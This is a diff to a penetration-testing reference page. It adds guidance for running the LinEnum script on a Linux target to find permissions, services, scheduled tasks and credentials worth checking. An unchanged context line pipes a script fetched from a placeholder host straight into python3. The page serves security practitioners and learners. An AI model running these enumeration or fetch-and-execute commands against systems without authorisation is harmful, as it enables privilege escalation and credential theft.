@@ -7,7 +7,37 @@ boost: 10
 hideFooterPagination: true
 ---
 
+import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+
 {/* Generated from Commands/linenum.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+
+## Current operation: Run a basic Linux enumeration report
+
+**Run in:** Linux target. **Requires:** The intended LinEnum script already available locally and Bash support; optional deeper scans have different scope/cost.
+
+```bash
+bash ./LinEnum.sh
+```
+
+**Read the result:** Use the report to shortlist local permissions, services, scheduled tasks and credentials worth checking manually.
+
+**If The report lacks a service or privilege detail:** Missing commands or restricted file access reduce coverage; an empty section is not a guarantee of a secure configuration.
+
+**Next check:** Use a direct query for the missing evidence, then verify permissions and the privileged process that would consume the candidate object.
+
+**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
+
+### Reviewed operation documentation
+
+- [Primary reference 1](https://github.com/rebootuser/LinEnum)
+
+## Preserved earlier notes
+
+<PreservedNotes>
+
+Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
 
 ## Enumerate from identity to privileged execution
 
@@ -182,3 +212,5 @@ wget -qO- http://<IP>/helloworld.py | python3           # -q = quiet, -O- = outp
 - [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
 
 {/* VAULT_RELATED_END */}
+
+</PreservedNotes>
